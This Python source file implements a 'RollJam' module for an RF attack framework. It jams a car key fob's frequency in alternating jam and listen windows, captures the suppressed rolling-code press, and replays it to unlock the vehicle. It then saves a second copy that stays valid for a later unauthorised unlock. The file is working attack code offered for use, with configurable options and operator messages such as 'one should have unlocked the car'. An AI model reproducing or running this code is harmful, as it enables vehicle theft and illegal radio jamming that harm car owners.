"""RollJam: jam, capture the suppressed frame, then dominate with both copies.

The classic two-transaction attack:

1. hold the carrier down so the fob's press never reaches the car;
2. the fob still transmits — capture it off the air while jamming;
3. release the jam and fire ``captured + captured`` in one tight marquee train
   *before* the owner presses again.

The car accepts the first copy (advancing its counter) and leaves the second
one good for whoever replays it later.

Half-duplex reality check: on a CC1101 the TX strobe takes the radio out of RX,
so the edge handler cannot decode while the carrier is up. Phase 1 therefore
*alternates* short jam and listen windows (``JAM_MS`` / ``LISTEN_MS``). The
duty cycle is what suppresses the car while still letting us hear the fob — the
same trade a dedicated rolljam board makes, just slower.
"""

from __future__ import annotations

import os
import time

from omni.core import config, console
from omni.core.module import Option
from omni.rf import marquee
from omni.rf.modules._base import RfModule

__all__ = ["RollJam"]


class RollJam(RfModule):
    NAME = "rf.rolljam"
    DESCRIPTION = "Jam a fob press, capture it, then dominate with both copies"
    OPTIONS = (Option("FREQ", "carrier in Hz", "", required=True),
               Option("PRESET", "modem preset", "AM650"),
               Option("SECONDS", "how long to keep jamming", "8"),
               Option("JAM_MS", "carrier-up slice per cycle", "120"),
               Option("LISTEN_MS", "listen slice per cycle", "40"),
               Option("COPIES", "copies of the captured frame to fire", "3"),
               Option("GAP", "extra dead air between bursts, ms", "0"),
               Option("SAVE", "keep the captured frame and plan", "true",
                      choices=("true", "false")))

    def execute(self) -> dict:
        rig = self.rig()
        freq = self.freq()
        preset = self.preset()
        captured: list[marquee.Frame] = []
        rx = rig.rx()

        def _on_frame(result) -> None:
            if result.data_count_bit < 12:
                return
            captured.append(marquee.Frame(
                protocol=result.protocol_name, data=result.data,
                bits=result.data_count_bit, te=int(result.te or 400),
                frequency=freq, preset=preset.short))
            console.ok(f"captured {result.protocol_name} 0x{result.data:X}")

        try:
            rx.on_found(_on_frame)
            rx.start(preset, freq)
            rig.radio.idle()
            jam_s = max(20, self.get_int("JAM_MS", 120)) / 1000.0
            listen_s = max(10, self.get_int("LISTEN_MS", 40)) / 1000.0
            console.info(f"jamming {freq / 1e6:.3f} MHz — press the fob now")
            deadline = time.time() + max(1, self.get_int("SECONDS", 8))
            cycles = 0
            try:
                while time.time() < deadline and not captured:
                    rig.radio.start_tx()             # suppress the car
                    time.sleep(jam_s)
                    rig.radio.idle()                 # listen for the fob
                    time.sleep(listen_s)
                    cycles += 1
            except KeyboardInterrupt:
                pass
            finally:
                rig.radio.idle()
                rx.stop()

            if not captured:
                console.warn("nothing captured — lengthen LISTEN_MS or SECONDS, "
                             "or move closer; the press may have been missed")
                return {"captured": 0, "sent": 0, "cycles": cycles,
                        "demo": rig.demo}

            # phase 3: both copies, tightest possible train
            frame = captured[-1]
            slots = marquee.plan([frame, frame], "capture",
                                 self.get_int("COPIES", 3))
            gap = marquee.clamp_gap(self.get_int("GAP", 0))
            sub = marquee.to_sub(slots, gap)
            saved = ""
            if self.get_bool("SAVE", True):
                saved = os.path.join(config.output_dir("rf/rolljam"),
                                     f"rolljam_{int(freq / 1000)}.sub")
                sub.save(saved)
            sent = rig.tx().send_subfile(sub)
            console.ok("both copies fired — one should have unlocked the car, "
                       "the other is now good once")
            if saved:
                console.info(f"re-usable copy: {saved}")
            return {"captured": len(captured), "sent": sent, "cycles": cycles,
                    "gap_ms": gap,
                    "air_ms": marquee.timing(slots, gap)["total_ms"],
                    "saved": saved, "demo": rig.demo}
        finally:
            try:
                rig.radio.idle()
            finally:
                rig.close()
